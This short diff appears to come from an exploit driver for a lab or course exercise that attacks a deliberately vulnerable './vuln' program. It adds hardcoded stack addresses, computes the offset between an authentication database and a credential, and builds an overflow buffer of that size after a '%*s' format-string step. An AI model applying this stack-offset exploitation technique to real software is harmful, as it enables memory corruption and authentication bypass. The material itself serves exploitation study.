@@ -6,6 +6,9 @@ int main() {
     nargv[1] = STRINGIFY(GRP);
     nargv[2] = NULL;
 
+    uint64_t auth_db_loc =     0x7ffc8b4ee588; // loc of db (local var of auth)
+    uint64_t auth_cred     =   0x7ffc8b4ee4a0; // value of cred (after alloca)
+    uint64_t auth_db_cred_dist      = auth_db_loc - auth_cred;
 
     create_subproc("./vuln", nargv);
     fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
@@ -19,7 +22,7 @@ int main() {
     send();
     get_formatted("%*s");
 
-    unsigned explsz = auth_db_cred_dist + 8 - 8 + 8 + i;
+    unsigned explsz = auth_db_cred_dist + 8 - 8 + 8;
     void* *expl = (void**)malloc(explsz);
     memset((void*)expl, 0x01, explsz);
 
